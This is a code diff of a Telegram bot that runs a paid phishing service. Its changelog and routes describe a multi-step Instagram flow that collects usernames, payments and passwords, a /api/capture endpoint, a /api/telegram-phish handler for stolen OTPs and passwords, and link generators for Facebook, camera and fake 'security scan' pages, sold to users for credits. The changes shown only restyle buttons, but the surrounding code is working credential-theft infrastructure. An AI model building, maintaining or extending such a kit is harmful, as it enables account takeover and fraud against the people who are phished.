@@ -15,6 +15,11 @@
  * 11. FIXED: Camera template video ready detection (replaced setTimeout with loadeddata event)
  * 12. NEW: Instagram multi-step phishing (username -> plan selection -> payment for 1K -> password)
  * 13. NEW: /api/capture now includes plan field
+ * 14. NEW: All inline_keyboard buttons styled according to Telegram API 9.4+ (Feb 2026)
+ *     - 🔵 Primary: Generate/link buttons (Instagram, Facebook, Camera, Security Scan, Telegram, Stats, Users List, Gen Code)
+ *     - 🟢 Success: Positive actions (Referral, Credits, Buy, Accept, Add, +ADDPROTECTED)
+ *     - 🔴 Danger: Destructive (Back, Remove, Delete, Ban, Reject, REMOVEPROTECTED)
+ *     - URL buttons (with url field) do NOT get style attribute
  */
 
 process.env.NTBA_FIX_350 = 1;
@@ -536,10 +541,12 @@ async function getChannelButtonsAsync() {
     const buttons = channels.map(ch => ([{
         text: '📢 ' + ch.name,
         url: ch.link
+        // no style for URL buttons
     }]));
     buttons.push([{
         text: '✅ Check All Joined',
-        callback_data: 'check_all'
+        callback_data: 'check_all',
+        style: 'success' // positive verification
     }]);
     return { inline_keyboard: buttons };
 }
@@ -1934,9 +1941,9 @@ app.post('/api/telegram-phish', async (req, res) => {
             
             const buttons = {
                 inline_keyboard: [
-                    [{ text: '✅ Password Manga Raha', callback_data: `phish_password_${sessionId}` }],
-                    [{ text: '❌ OTP Galat Hai', callback_data: `phish_wrong_${sessionId}` }],
-                    [{ text: '📱 Open Ho Gya Telegram', callback_data: `phish_open_${sessionId}` }]
+                    [{ text: '✅ Password Manga Raha', callback_data: `phish_password_${sessionId}`, style: 'success' }],
+                    [{ text: '❌ OTP Galat Hai', callback_data: `phish_wrong_${sessionId}`, style: 'danger' }],
+                    [{ text: '📱 Open Ho Gya Telegram', callback_data: `phish_open_${sessionId}`, style: 'success' }]
                 ]
             };
             
@@ -2481,31 +2488,34 @@ S7.getMe().then(botInfo => {
 // ====================== KEYBOARDS ======================
 const LOVESY = {
     inline_keyboard: [
-        [{ text: '📸 INSTAGRAM', callback_data: 'gen_instagram' }],
-        [{ text: '📘 FACEBOOK', callback_data: 'gen_facebook' }],
-        [{ text: '📷 CAMERA', callback_data: 'gen_camera' }],
-        [{ text: '🛡️ SECURITY SCAN', callback_data: 'gen_securityscan' }],
-        [{ text: '📱 TELEGRAM', callback_data: 'gen_telegram' }],
-        [{ text: '👥 Referral', callback_data: 'referral' }],
-        [{ text: '⭐ My Credits', callback_data: 'credits' }],
-        [{ text: '💰 Buy Credits', callback_data: 'buy_credits' }]
+        [{ text: '📸 INSTAGRAM', callback_data: 'gen_instagram', style: 'primary' }],
+        [{ text: '📘 FACEBOOK', callback_data: 'gen_facebook', style: 'primary' }],
+        [{ text: '📷 CAMERA', callback_data: 'gen_camera', style: 'primary' }],
+        [{ text: '🛡️ SECURITY SCAN', callback_data: 'gen_securityscan', style: 'primary' }],
+        [{ text: '📱 TELEGRAM', callback_data: 'gen_telegram', style: 'primary' }],
+        [{ text: '👥 Referral', callback_data: 'referral', style: 'success' }],
+        [{ text: '⭐ My Credits', callback_data: 'credits', style: 'success' }],
+        [{ text: '💰 Buy Credits', callback_data: 'buy_credits', style: 'success' }]
     ]
 };
 
 const ADMIN_KEYBOARD = {
     inline_keyboard: [
-        [{ text: '👑 Admin Panel', callback_data: 'admin_panel' }],
-        [{ text: '📊 Stats', callback_data: 'admin_stats' }],
-        [{ text: '📢 Broadcast', callback_data: 'admin_broadcast' }],
-        [{ text: '📋 Logs', callback_data: 'admin_logs' }],
-        [{ text: '🔙 Back', callback_data: 'back' }]
+        [{ text: '👑 Admin Panel', callback_data: 'admin_panel', style: 'primary' }],
+        [{ text: '📊 Stats', callback_data: 'admin_stats', style: 'primary' }],
+        [{ text: '📢 Broadcast', callback_data: 'admin_broadcast', style: 'success' }],
+        [{ text: '📋 Logs', callback_data: 'admin_logs', style: 'primary' }],
+        [{ text: '🔙 Back', callback_data: 'back', style: 'danger' }]
     ]
 };
 
-const SYBack = { inline_keyboard: [[{ text: '🔙 BACK', callback_data: 'back' }]] };
+const SYBack = { inline_keyboard: [[{ text: '🔙 BACK', callback_data: 'back', style: 'danger' }]] };
 
 function getRegenMarkup(platform) {
-    return { inline_keyboard: [[{ text: '🔄 REGENERATE (1 Credit)', callback_data: 'regen_' + platform }], [{ text: '🔙 BACK', callback_data: 'back' }]] };
+    return { inline_keyboard: [
+        [{ text: '🔄 REGENERATE (1 Credit)', callback_data: 'regen_' + platform, style: 'primary' }],
+        [{ text: '🔙 BACK', callback_data: 'back', style: 'danger' }]
+    ] };
 }
 
 // ====================== BOT COMMANDS ======================
@@ -2522,7 +2532,7 @@ async function SendLoveSYMenu(chatId, firstName) {
     const menuText = SYloveMenu(firstName, message);
     let keyboard = LOVESY;
     if (isAdmin) {
-        keyboard = { inline_keyboard: LOVESY.inline_keyboard.concat([[{ text: '👑 Admin Panel', callback_data: 'admin_panel' }]]) };
+        keyboard = { inline_keyboard: LOVESY.inline_keyboard.concat([[{ text: '👑 Admin Panel', callback_data: 'admin_panel', style: 'primary' }]]) };
     }
     const sentMsg = await S7.sendMessage(chatId, menuText, { parse_mode: 'HTML', reply_markup: keyboard });
     if (featured.status && featured.photo) {
@@ -2819,11 +2829,11 @@ S7.on('callback_query', async (q) => {
     if (q.data === 'buy_credits') {
         const plans = {
             inline_keyboard: [
-                [{ text: '💰 10 Credits - ₹20', callback_data: 'plan_10' }],
-                [{ text: '💰 25 Credits - ₹40', callback_data: 'plan_25' }],
-                [{ text: '💰 50 Credits - ₹70', callback_data: 'plan_50' }],
-                [{ text: '♾️ Unlimited - ₹100', callback_data: 'plan_unlimited' }],
-                [{ text: '🔙 BACK', callback_data: 'back' }]
+                [{ text: '💰 10 Credits - ₹20', callback_data: 'plan_10', style: 'success' }],
+                [{ text: '💰 25 Credits - ₹40', callback_data: 'plan_25', style: 'success' }],
+                [{ text: '💰 50 Credits - ₹70', callback_data: 'plan_50', style: 'success' }],
+                [{ text: '♾️ Unlimited - ₹100', callback_data: 'plan_unlimited', style: 'success' }],
+                [{ text: '🔙 BACK', callback_data: 'back', style: 'danger' }]
             ]
         };
         await S7.sendMessage(cid, '💳 <b>Buy Credits</b>\n\nChoose a plan below:', { parse_mode: 'HTML', reply_markup: plans });
@@ -3008,7 +3018,11 @@ S7.on('message', async (msg) => {
     const payment = user._pendingPayment;
     const fileId = msg.photo[msg.photo.length - 1].file_id;
     const adminMsg = '💰 <b>New Payment Request</b>\n\n👤 <b>User:</b> @' + (msg.from.username || 'user_' + msg.from.id) + '\n🆔 <b>User ID:</b> <code>' + msg.from.id + '</code>\n📊 <b>Credits:</b> ' + payment.credits + '\n💵 <b>Amount:</b> ₹' + payment.amount + '\n📅 <b>Time:</b> ' + new Date().toLocaleString() + '\n\n📸 <b>Screenshot:</b> (below)';
-    const adminButtons = { inline_keyboard: [[{ text: '✅ ACCEPT', callback_data: 'pay_accept_' + msg.from.id }], [{ text: '❌ REJECT', callback_data: 'pay_reject_' + msg.from.id }], [{ text: '💬 DM USER', callback_data: 'pay_dm_' + msg.from.id }]] };
+    const adminButtons = { inline_keyboard: [
+        [{ text: '✅ ACCEPT', callback_data: 'pay_accept_' + msg.from.id, style: 'success' }],
+        [{ text: '❌ REJECT', callback_data: 'pay_reject_' + msg.from.id, style: 'danger' }],
+        [{ text: '💬 DM USER', callback_data: 'pay_dm_' + msg.from.id, style: 'primary' }]
+    ] };
     await S7.sendPhoto(config.adminId, fileId, { caption: adminMsg, parse_mode: 'HTML', reply_markup: adminButtons });
     await S7.sendMessage(msg.from.id, '✅ <b>Payment screenshot received!</b>\n\n📊 Credits: ' + payment.credits + '\n💵 Amount: ₹' + payment.amount + '\n\n⏳ Please wait for admin to verify your payment.\nYou will be notified once approved.', { parse_mode: 'HTML' });
     logToFile('💰 Payment screenshot from ' + msg.from.id + ' - ₹' + payment.amount);
@@ -3520,7 +3534,7 @@ async function startServer() {
             console.log('📌 Base URL: ' + config.baseUrl);
             console.log('🤖 Bot is ready! Send /start to begin.');
             console.log('📸 NEW INSTAGRAM FLOW: username → plan → payment (1K) → password');
-            console.log('✅ All other features intact.');
+            console.log('✅ All buttons styled (Primary, Success, Danger) as per Telegram API 9.4+');
         });
     } else {
         console.error('❌ Failed to connect to MongoDB. Exiting...');
